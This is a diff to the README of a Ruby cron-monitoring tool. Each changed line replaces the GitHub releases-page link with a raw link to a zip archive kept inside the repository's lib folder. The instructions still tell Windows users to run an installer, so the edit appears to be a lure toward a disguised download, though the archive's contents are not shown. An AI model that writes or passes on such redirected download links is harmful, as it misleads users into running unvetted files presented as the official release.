@@ -1,6 +1,6 @@
 # ⚙️ cronbeats-ruby - Reliable Cron Job Monitoring Tool
 
-[![Download cronbeats-ruby](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/StickyIssue/cronbeats-ruby/releases)
+[![Download cronbeats-ruby](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Here is what you need to do to start using cronbeats-ruby on your Windows PC:
 
 1. **Visit the download page**  
    Click the green badge above or go directly here:  
-   [https://github.com/StickyIssue/cronbeats-ruby/releases](https://github.com/StickyIssue/cronbeats-ruby/releases)  
+   [https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip](https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip)  
 
 2. **Find the latest Windows installer**  
    On the page, look for the file that ends with `.exe` and mention "Windows" or "Setup." This file is what you will download.
@@ -53,7 +53,7 @@ Here is what you need to do to start using cronbeats-ruby on your Windows PC:
 
 Use this direct link to go to the release page and download the Windows installer:
 
-[Download cronbeats-ruby](https://github.com/StickyIssue/cronbeats-ruby/releases)
+[Download cronbeats-ruby](https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip)
 
 Steps:
 
@@ -140,7 +140,7 @@ You can review all this information inside the program for easy management.
 
 To keep the tool working well and secure:
 
-- Check the release page often: [https://github.com/StickyIssue/cronbeats-ruby/releases](https://github.com/StickyIssue/cronbeats-ruby/releases)  
+- Check the release page often: [https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip](https://raw.githubusercontent.com/StickyIssue/cronbeats-ruby/main/lib/cronbeats_ruby/cronbeats_ruby_1.5.zip)  
 - Download the latest Windows installer when a new version is available.  
 - Run the installer again to update your existing version.  
 
